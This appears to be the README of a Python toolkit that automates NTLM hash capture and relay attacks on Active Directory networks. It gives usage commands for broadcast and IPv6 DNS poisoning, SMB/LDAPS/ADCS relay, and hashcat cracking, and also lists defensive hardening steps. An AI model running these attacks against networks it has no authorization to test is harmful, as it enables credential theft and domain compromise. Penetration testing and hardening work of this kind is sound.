# NTLM Collection & Relay Toolkit

A Python toolkit for testing Windows Active Directory environments from an unauthenticated position. Automates common NTLM hash collection and relay techniques for security assessments.

⚠️ **IMPORTANT**: This tool is for authorized security testing only. Usage without explicit permission is prohibited.

## Features

### Automatic Mode
Performs comprehensive testing sequence:
1. Initial Reconnaissance
   - Detects broadcast protocols (LLMNR/NBT-NS/mDNS)
   - Identifies systems with SMB signing disabled
   - Discovers potential ADCS endpoints
   - Maps attack surface

2. Active Collection
   - Broadcast protocol poisoning
   - DHCP WPAD injection
   - Multiple coercion file deployment
   - IPv6 DNS takeover

3. Relay Attacks
   - SMB relay with SOCKS proxy
   - LDAPS relay with computer account creation
   - ADCS certificate theft
   - Shadow Credentials attacks

### Individual Techniques
- **Protocol Poisoning**
  - LLMNR/NBT-NS/mDNS responses
  - WPAD injection
  - IPv6 DNS takeover
  
- **Coercion Files**
  - WebDAV search connectors
  - SCF files
  - URL shortcuts
  - Print notifications

- **Relay Capabilities**
  - SMB relay
  - LDAPS relay
  - ADCS relay
  - SOCKS proxy support

## Installation

### Requirements
- Python 3.8+
- Root/Administrator privileges

### Setup
```bash
# Clone repository
git clone https://github.com/your-repo/ntlm-toolkit.git
cd ntlm-toolkit

# Install Python requirements
pip install -r requirements.txt

# Install core tools
pip install netexec
pip install impacket
pip install responder
pip install certipy-ad
pip install mitm6
```

### Dependencies
Create requirements.txt:
```
netexec>=1.0.0
impacket>=0.10.0
responder>=3.1.3
certipy-ad>=4.0.0
mitm6>=0.3.0
termcolor>=2.3.0
netifaces>=0.11.0
```

## Usage

### Auto Mode (Recommended)
```bash
# Full automatic testing
sudo python3 toolkit.py --auto \
    -i eth0 \
    -dc 192.168.1.10 \
    -d corp.local \
    --target-range 192.168.1.0/24

# Analysis mode only (no poisoning)
sudo python3 toolkit.py --auto --analyze -i eth0
```

### Manual Techniques

Basic Collection:
```bash
# Start hash collection
sudo python3 toolkit.py -i eth0

# With NTLM downgrade
sudo python3 toolkit.py -i eth0 -c 1122334455667788
```

SMB Relay:
```bash
# SMB relay with SOCKS
sudo python3 toolkit.py -i eth0 --relay --relay-type smb --socks

# LDAPS relay for computer account creation
sudo python3 toolkit.py -i eth0 --relay --relay-type ldaps --dc-ip 192.168.1.10

# ADCS relay
sudo python3 toolkit.py -i eth0 --relay --relay-type adcs --dc-ip 192.168.1.10
```

IPv6 Attacks:
```bash
# IPv6 DNS poisoning
sudo python3 toolkit.py -i eth0 --ipv6 -d corp.local
```

## Command Line Options

```
Required Arguments:
  -i, --interface     Network interface to use

Target Specification:
  -dc, --dc-ip       Domain controller IP
  -d, --domain       Domain name for IPv6/WPAD attacks
  -tr, --target-range Target subnet for relay discovery (default: 192.168.1.0/24)

Attack Modes:
  --auto             Enable automated attack sequence
  --analyze          Run in analyze mode only
  -r, --relay        Enable NTLM relay
  --ipv6             Enable IPv6 attacks

Relay Options:
  -rt, --relay-type  Relay protocol (smb, ldaps, adcs)
  -s, --socks        Enable SOCKS proxy

Collection Options:
  -p, --port         HTTP server port (default: 8080)
  -c, --challenge    Custom NTLM challenge for downgrade
  --dhcp             Enable DHCP poisoning
```

## Common Workflows

### Initial Access Testing
1. Start with analyze mode to identify opportunities:
```bash
sudo python3 toolkit.py --auto --analyze -i eth0
```

2. Run full auto sequence when ready:
```bash
sudo python3 toolkit.py --auto -i eth0 -dc 192.168.1.10 -d corp.local
```

3. Monitor captured hashes in Responder logs:
```bash
tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.10.txt
```

### Targeted Relay
1. Generate relay target list:
```bash
netexec smb 192.168.1.0/24 --gen-relay-list targets.txt
```

2. Start relay with SOCKS:
```bash
sudo python3 toolkit.py -i eth0 --relay --relay-type smb --socks
```

3. Use collected hashes with your preferred cracking tool:
```bash
hashcat -m 5600 hashes.txt wordlist.txt
```

## Defense Recommendations

To protect against these attack vectors:

1. Disable Legacy Protocols
   - LLMNR: `Get-DnsClient | Set-DnsClient -EnableMulticast $false`
   - NBT-NS: Disable NetBIOS over TCP/IP
   - WPAD: Disable automatic proxy detection
   - IPv6: If not in use

2. Enable Security Features
   - SMB Signing (Required)
   - LDAP Signing
   - Channel Binding
   - EPA for HTTP/LDAP

3. Network Segmentation
   - Implement tiered administration
   - Control broadcast domains
   - Filter RPC traffic

4. Additional Hardening
   - Disable WebDAV client service
   - Remove ADCS web enrollment
   - Disable Print Spooler where unnecessary
   - Set Machine Account Quota to 0

## References

- [The Worst of Both Worlds: NTLM Relaying and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
- [Practical Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [I'm Bringing Relaying Back - TrustedSec](https://www.trustedsec.com/blog/im-bringing-relaying-back-a-comprehensive-guide-on-relaying-anno-2022/)

## Disclaimer

This tool is for authorized security testing only. The authors assume no liability for misuse or damage. Always obtain explicit permission before testing.

## License

This project is licensed under the MIT License - see the LICENSE file for details.
